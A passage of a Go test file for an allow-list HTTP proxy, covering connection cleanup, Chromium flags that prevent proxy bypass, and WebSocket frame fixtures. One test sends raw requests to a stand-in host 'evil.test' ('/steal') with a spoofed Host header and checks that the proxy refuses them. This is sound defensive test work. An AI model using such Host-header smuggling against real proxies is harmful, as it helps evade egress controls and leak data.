		fmt.Fprint(w, "ok")
	}))
	defer origin.Close()

	pol := mustPolicy(t, []string{"http://" + hostPort(t, origin.URL)}, true)
	p := mustProxy(t, Options{Policy: pol})
	transport := &http.Transport{Proxy: proxyFunc(t, p), DisableKeepAlives: true}
	client := &http.Client{Transport: transport, Timeout: 10 * time.Second}

	for i := 0; i < 20; i++ {
		resp, err := client.Get(origin.URL + "/")
		if err != nil {
			t.Fatalf("GET #%d: %v", i, err)
		}
		_, _ = io.Copy(io.Discard, resp.Body)
		_ = resp.Body.Close()
	}
	transport.CloseIdleConnections()

	// Every conn (client side and upstream dial) must have unregistered itself.
	if !waitFor(t, func() bool { return p.connCount() == 0 }, 5*time.Second) {
		t.Fatalf("conn registry holds %d conns after 20 completed requests, want 0", p.connCount())
	}
	if got := p.Stats().ActiveConns; got != 0 {
		t.Fatalf("ActiveConns = %d, want 0", got)
	}
}

func TestHostHeaderCannotRedirectTarget(t *testing.T) {
	var hits atomic.Int64
	origin := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		hits.Add(1)
		fmt.Fprint(w, "reached")
	}))
	defer origin.Close()
	authority := hostPort(t, origin.URL)

	pol := mustPolicy(t, []string{"http://" + authority}, true)
	p := mustProxy(t, Options{Policy: pol})

	// The request-target (what was authorized and will be dialed) names an
	// unauthorized name; the Host header names the authorized origin. The check
	// and the dial must both follow the request-target, never the header, or a
	// client could steer a permitted check onto a different socket.
	send := func(raw string) *http.Response {
		t.Helper()
		conn, err := net.Dial("tcp", p.Addr())
		if err != nil {
			t.Fatalf("dial proxy: %v", err)
		}
		t.Cleanup(func() { _ = conn.Close() })
		_ = conn.SetDeadline(time.Now().Add(10 * time.Second))
		if _, err := io.WriteString(conn, raw); err != nil {
			t.Fatalf("write: %v", err)
		}
		resp, err := http.ReadResponse(bufio.NewReader(conn), &http.Request{Method: http.MethodConnect})
		if err != nil {
			t.Fatalf("read response: %v", err)
		}
		t.Cleanup(func() { _ = resp.Body.Close() })
		return resp
	}

	connectResp := send("CONNECT evil.test:443 HTTP/1.1\r\nHost: " + authority + "\r\n\r\n")
	if connectResp.StatusCode != http.StatusForbidden {
		t.Fatalf("CONNECT status = %d, want 403 (authority, not Host, is authorized)", connectResp.StatusCode)
	}
	forwardResp := send("GET http://evil.test/steal HTTP/1.1\r\nHost: " + authority + "\r\n\r\n")
	if forwardResp.StatusCode != http.StatusForbidden {
		t.Fatalf("forward status = %d, want 403", forwardResp.StatusCode)
	}
	if got := hits.Load(); got != 0 {
		t.Fatalf("authorized origin was reached %d times, want 0", got)
	}
}

func TestChromiumFlags(t *testing.T) {
	p := mustProxy(t, Options{Policy: mustPolicy(t, nil, false)})

	required := []string{
		"--proxy-server=" + p.URL(),
		"--proxy-bypass-list=",
		"--host-resolver-rules=MAP * ~NOTFOUND",
		"--disable-quic",
		"--force-webrtc-ip-handling-policy=disable_non_proxied_udp",
		"--webrtc-ip-handling-policy=disable_non_proxied_udp",
	}
	flags := ChromiumFlags(p, false)
	for _, want := range required {
		count := 0
		for _, got := range flags {
			if got == want {
				count++
			}
		}
		if count != 1 {
			t.Fatalf("flag %q appears %d times, want exactly 1 (flags = %v)", want, count, flags)
		}
	}

	withExtra := ChromiumFlags(p, true)
	for _, want := range required {
		count := 0
		for _, got := range withExtra {
			if got == want {
				count++
			}
		}
		if count != 1 {
			t.Fatalf("extraDeny: flag %q appears %d times, want 1 (flags = %v)", want, count, withExtra)
		}
	}
	if len(withExtra) <= len(flags) {
		t.Fatalf("extraDeny added %d flags, want more than 0", len(withExtra)-len(flags))
	}
}

// splitHostPortForTest splits an httptest URL into its host and port.
func splitHostPortForTest(t *testing.T, rawURL string) (string, int) {
	t.Helper()
	u, err := url.Parse(rawURL)
	if err != nil {
		t.Fatalf("url.Parse(%q): %v", rawURL, err)
	}
	host, portStr, err := net.SplitHostPort(u.Host)
	if err != nil {
		t.Fatalf("SplitHostPort(%q): %v", u.Host, err)
	}
	port, err := strconv.Atoi(portStr)
	if err != nil {
		t.Fatalf("Atoi(%q): %v", portStr, err)
	}
	return host, port
}

// sha1Sum is the digest used by the WebSocket handshake (RFC 6455 §4.1).
func sha1Sum(s string) []byte {
	sum := sha1.Sum([]byte(s))
	return sum[:]
}

// waitFor polls cond until it holds or the timeout expires.
func waitFor(t *testing.T, cond func() bool, timeout time.Duration) bool {
	t.Helper()
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		if cond() {
			return true
		}
		time.Sleep(5 * time.Millisecond)
	}
	return cond()
}

// --- WebSocket test fixtures ----------------------------------------------

// serveWSEcho is a minimal stdlib WebSocket echo: complete the handshake, read
// one masked client frame, echo its payload back unmasked, then return.
func serveWSEcho(w http.ResponseWriter, r *http.Request) {
	if !strings.EqualFold(r.Header.Get("Upgrade"), "websocket") {
		http.Error(w, "not an upgrade", http.StatusBadRequest)
		return
	}
	key := r.Header.Get("Sec-WebSocket-Key")
	hj, ok := w.(http.Hijacker)
	if !ok {
		http.Error(w, "no hijack", http.StatusInternalServerError)
		return
	}
	conn, brw, err := hj.Hijack()
	if err != nil {
		return
	}
	defer func() { _ = conn.Close() }()
	_ = conn.SetDeadline(time.Now().Add(10 * time.Second))

	accept := wsAccept(key)
	if _, err := fmt.Fprintf(conn,
		"HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Accept: %s\r\n\r\n",
		accept); err != nil {
		return
	}
	opcode, payload, err := readClientFrame(brw.Reader)
	if err != nil {
		return
	}
	_ = writeServerFrame(conn, opcode, payload)
}

func wsAccept(key string) string {
	const guid = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
	sum := sha1Sum(key + guid)
	return base64.StdEncoding.EncodeToString(sum)
}

func readClientFrame(r *bufio.Reader) (byte, []byte, error) {
	var hdr [2]byte
	if _, err := io.ReadFull(r, hdr[:]); err != nil {
		return 0, nil, err
	}
	opcode := hdr[0] & 0x0f
	masked := hdr[1]&0x80 != 0
	length := int(hdr[1] & 0x7f)
	switch length {
	case 126:
		var ext [2]byte
		if _, err := io.ReadFull(r, ext[:]); err != nil {
			return 0, nil, err
		}
		length = int(binary.BigEndian.Uint16(ext[:]))
	case 127:
		var ext [8]byte
		if _, err := io.ReadFull(r, ext[:]); err != nil {
			return 0, nil, err
		}
		length = int(binary.BigEndian.Uint64(ext[:]))
	}
	var mask [4]byte
	if masked {
		if _, err := io.ReadFull(r, mask[:]); err != nil {
			return 0, nil, err
		}
	}
	payload := make([]byte, length)
	if _, err := io.ReadFull(r, payload); err != nil {
		return 0, nil, err
	}
	if masked {
		for i := range payload {
			payload[i] ^= mask[i%4]
		}
	}
	return opcode, payload, nil
}

func writeClientFrame(w io.Writer, opcode byte, payload []byte) error {
	if len(payload) > 125 {
		return errors.New("test frame too large")
	}
	frame := []byte{0x80 | opcode, 0x80 | byte(len(payload)), 0x01, 0x02, 0x03, 0x04}
	for i, b := range payload {
		frame = append(frame, b^[]byte{0x01, 0x02, 0x03, 0x04}[i%4])
	}
	_, err := w.Write(frame)
	return err
}

func writeServerFrame(w io.Writer, opcode byte, payload []byte) error {
	if len(payload) > 125 {
		return errors.New("test frame too large")
	}
	frame := append([]byte{0x80 | opcode, byte(len(payload))}, payload...)
	_, err := w.Write(frame)
	return err
}

func readServerFrame(r *bufio.Reader) (byte, []byte, error) {
	var hdr [2]byte
	if _, err := io.ReadFull(r, hdr[:]); err != nil {
		return 0, nil, err
	}
	opcode := hdr[0] & 0x0f
	length := int(hdr[1] & 0x7f)
	switch length {
	case 126:
		var ext [2]byte
		if _, err := io.ReadFull(r, ext[:]); err != nil {
			return 0, nil, err
		}
		length = int(binary.BigEndian.Uint16(ext[:]))
	case 127:
		var ext [8]byte
		if _, err := io.ReadFull(r, ext[:]); err != nil {
			return 0, nil, err
		}
		length = int(binary.BigEndian.Uint64(ext[:]))
	}
	payload := make([]byte, length)
	if _, err := io.ReadFull(r, payload); err != nil {
		return 0, nil, err
	}
	return opcode, payload, nil
}
